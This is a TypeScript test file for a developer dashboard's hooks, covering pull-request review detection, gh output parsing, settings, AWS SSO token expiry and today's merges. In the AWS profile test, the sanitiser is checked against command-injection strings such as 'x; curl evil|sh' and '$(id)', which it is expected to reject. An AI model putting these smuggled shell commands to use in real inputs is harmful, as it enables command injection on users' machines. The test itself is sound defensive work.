import { describe, expect, test } from 'claude-code/testing'

import { awsProfile, left, lines, logins, merged, names, prompt, pulls, repos, seconds, ssoExpiry, ssoStartUrl, state, today } from '../hooks/panel'

const SHA = 'b5687a5e1c0d2f3a4b5c6d7e8f9a0b1c2d3e4f5a'

describe('reviewed heads', () => {
  test('a comment naming the short head reviews it', () => {
    expect(names('Verdict: approve. Reviewed head b5687a5.', SHA, '')).toBe(true)
    expect(names(`Reviewed ${SHA}`, SHA, '')).toBe(true)
  })
  test('another head, a shorter SHA or a different word does not', () => {
    expect(names('Verdict: approve at 12024fd.', SHA, '')).toBe(false)
    expect(names('Verdict at b5687a.', SHA, '')).toBe(false)
    expect(names('Merged b5687a5', SHA, 'Verdict')).toBe(false)
    expect(names('verdict: approve, head b5687a5', SHA, 'Verdict')).toBe(true)
  })
  test('the review word is a pattern: either form counts', () => {
    expect(names('**Verdict: approve** at b5687a5', SHA, 'Verdict|Independent review')).toBe(true)
    expect(names('Independent review of `b5687a5`: **merge**', SHA, 'Verdict|Independent review')).toBe(true)
    expect(names('Rebased: b5687a5 has the same tree', SHA, 'Verdict|Independent review')).toBe(false)
  })
  test('a pattern that does not compile is matched as plain text', () => {
    expect(names('Verdict (draft) at b5687a5', SHA, 'Verdict (')).toBe(true)
    expect(names('Verdict at b5687a5', SHA, 'Verdict (')).toBe(false)
  })
  test('a SHA inside a longer hex word does not count', () => {
    expect(names('id 00b5687a5e1', SHA, '')).toBe(false)
    expect(names('commitb5687a5', SHA, '')).toBe(false)
  })
})

describe('reading gh', () => {
  test('each pull request carries its head and whether it was reviewed', () => {
    const json = JSON.stringify([
      { number: 12, headRefOid: SHA, isDraft: false, title: 'feat: retries', comments: [{ body: 'Verdict: approve at b5687a5', author: { login: 'alice' } }] },
      { number: 13, headRefOid: '9c01e2a' + '0'.repeat(33), isDraft: true, title: 'new', comments: [] },
    ])
    const [first, second] = pulls('o/api', json, 'Verdict', ['alice'])
    expect(first).toMatchObject({ repo: 'o/api', number: 12, isReviewed: true, isDraft: false })
    expect(second).toMatchObject({ number: 13, isReviewed: false, isDraft: true })
  })
  test('only a reviewer\'s comment or review counts', () => {
    const one = (notes: object) => pulls('o/api', JSON.stringify([{ number: 12, headRefOid: SHA, isDraft: false, title: 't', ...notes }]), 'Verdict', ['alice', 'bob'])[0].isReviewed
    expect(one({ comments: [{ body: 'Verdict at b5687a5', author: { login: 'mallory' } }] })).toBe(false)
    expect(one({ comments: [{ body: 'Verdict at b5687a5' }] })).toBe(false)
    expect(one({ comments: [{ body: 'Verdict at b5687a5', author: { login: 'bob' } }] })).toBe(true)
    expect(one({ reviews: [{ body: 'Verdict at b5687a5', author: { login: 'alice' } }] })).toBe(true)
    expect(one({ reviews: [{ body: 'Verdict at b5687a5', author: { login: 'mallory' } }] })).toBe(false)
    expect(pulls('o/api', JSON.stringify([{ number: 12, headRefOid: SHA, isDraft: false, title: 't', comments: [{ body: 'Verdict at b5687a5', author: { login: 'alice' } }] }]), 'Verdict', [])[0].isReviewed).toBe(false)
  })
  test('gh output that is not JSON throws', () => {
    expect(() => pulls('o/api', 'not json', '', ['alice'])).toThrow()
  })
  test('a pressed Review shows as asked until a comment names the head, for ten minutes', () => {
    const [pull] = pulls('o/r', JSON.stringify([{ number: 5, headRefOid: SHA, isDraft: false, title: 't', comments: [] }]), '', [])
    expect(state(pull, [], 0)).toBe('new')
    expect(state(pull, [{ key: `o/r#5@${SHA}`, at: 1000 }], 1000 + 599_999)).toBe('asked')
    expect(state(pull, [{ key: `o/r#5@${SHA}`, at: 1000 }], 1000 + 600_000)).toBe('new')
    expect(state({ ...pull, isReviewed: true }, [{ key: `o/r#5@${SHA}`, at: 1000 }], 1000)).toBe('reviewed')
    expect(state(pull, [{ key: `o/r#5@${'1'.repeat(40)}`, at: 1000 }], 1000)).toBe('new')
  })
})

describe('the review prompt', () => {
  test('fills in the pull request', () => {
    const [pull] = pulls('o/r', JSON.stringify([{ number: 5, headRefOid: SHA, isDraft: false, title: 'feat: x' }]), '', [])
    expect(prompt('Review {repo}#{number} at {sha}: {title}; {sha}', pull)).toBe('Review o/r#5 at b5687a5: feat: x; b5687a5')
  })
  test('a title with $& or $` is written as it is', () => {
    const [pull] = pulls('o/r', JSON.stringify([{ number: 5, headRefOid: SHA, isDraft: false, title: 'cost $& and $` here' }]), '', [])
    expect(prompt('Review {repo}: {title}', pull)).toBe('Review o/r: cost $& and $` here')
  })
})

describe('sections', () => {
  test('headings, tones and blank lines', () => {
    expect(lines('## Sessions\n● api needs you\n✓ docs\n⠋ worker\n\n## Disk\n✓ 27% used  \n')).toEqual([
      { kind: 'heading', text: 'Sessions' },
      { kind: 'text', text: '● api needs you', tone: 'red' },
      { kind: 'text', text: '✓ docs', tone: 'green' },
      { kind: 'text', text: '⠋ worker', tone: 'blue' },
      { kind: 'heading', text: 'Disk' },
      { kind: 'text', text: '✓ 27% used', tone: 'green' },
    ])
  })
})

describe('settings', () => {
  test('repositories are owner/name; anything else is dropped', () => {
    expect(repos(' o/a  o/b.c bad o/ -x ')).toEqual(['o/a', 'o/b.c'])
  })
  test('reviewers are logins separated by spaces', () => {
    expect(logins(' alice  bob ')).toEqual(['alice', 'bob'])
    expect(logins('')).toEqual([])
  })
  test('the refresh is at least 15 seconds', () => {
    expect(seconds('120')).toBe(120)
    expect(seconds('15')).toBe(15)
    expect(seconds('14')).toBe(60)
    expect(seconds('5')).toBe(60)
    expect(seconds('x')).toBe(60)
  })
})

describe('the aws tab', () => {
  const CONFIG = '[default]\nregion = us-east-1\n\n[profile management]\nsso_session = paarpet\nregion = us-east-1\n\n[sso-session paarpet]\nsso_start_url = https://paar.awsapps.com/start\n\n[profile old]\nsso_start_url = https://old.awsapps.com/start # legacy\n'
  test('reads the start URL through the sso_session, or the profile\'s own', () => {
    expect(ssoStartUrl(CONFIG, 'management')).toBe('https://paar.awsapps.com/start')
    expect(ssoStartUrl(CONFIG, 'old')).toBe('https://old.awsapps.com/start')
    expect(ssoStartUrl(CONFIG, 'missing')).toBeUndefined()
  })
  test('the latest token for that URL counts; others and non-tokens do not', () => {
    const token = (url: string, at: string) => JSON.stringify({ startUrl: url, expiresAt: at, accessToken: 'x' })
    const caches = [
      token('https://paar.awsapps.com/start', '2026-10-23T10:00:00Z'),
      token('https://paar.awsapps.com/start', '2026-10-23T18:00:00Z'),
      token('https://other.awsapps.com/start', '2026-10-24T00:00:00Z'),
      JSON.stringify({ startUrl: 'https://paar.awsapps.com/start', clientId: 'c', expiresAt: '2027-01-01T00:00:00Z' }),
      'not json',
    ]
    expect(ssoExpiry(caches, 'https://paar.awsapps.com/start')).toBe(Date.parse('2026-10-23T18:00:00Z'))
    expect(ssoExpiry(caches, 'https://none/start')).toBeUndefined()
  })
  test('the profile is a plain name, else management', () => {
    expect(awsProfile(' dev ')).toBe('dev')
    expect(awsProfile('a.b@c+d-e_f')).toBe('a.b@c+d-e_f')
    for (const bad of ['', 'x; curl evil|sh', 'a b', '$(id)', 'p`x`']) expect(awsProfile(bad)).toBe('management')
  })
  test('time left reads in hours and minutes', () => {
    expect(left(125 * 60_000, 0)).toBe('2h 05m')
    expect(left(12 * 60_000 + 5000, 0)).toBe('12m')
    expect(left(0, 1)).toBe('expired')
  })
})

describe('the today tab', () => {
  test('keeps what merged since the start of today, newest first, with the short merge commit', () => {
    const json = JSON.stringify([
      { number: 1, title: 'old', url: 'u1', mergedAt: '2026-10-22T23:00:00Z', mergeCommit: { oid: 'aaaaaaaaaa' } },
      { number: 2, title: 'a', url: 'u2', mergedAt: '2026-10-23T09:00:00Z', mergeCommit: { oid: 'bbbbbbbbbb' } },
      { number: 3, title: 'b', url: 'u3', mergedAt: '2026-10-23T11:00:00Z', mergeCommit: null },
    ])
    const got = merged('o/api', json, Date.parse('2026-10-23T00:00:00Z'))
    expect(got.map(m => m.number)).toEqual([3, 2])
    expect(got[1]).toMatchObject({ repo: 'o/api', sha: 'bbbbbbb', url: 'u2', title: 'a' })
  })
  test('today is the local day', () => {
    const now = new Date(2026, 9, 23, 15, 30).getTime()
    expect(today(now)).toEqual({ since: new Date(2026, 9, 23).getTime(), day: '2026-10-23' })
  })
})
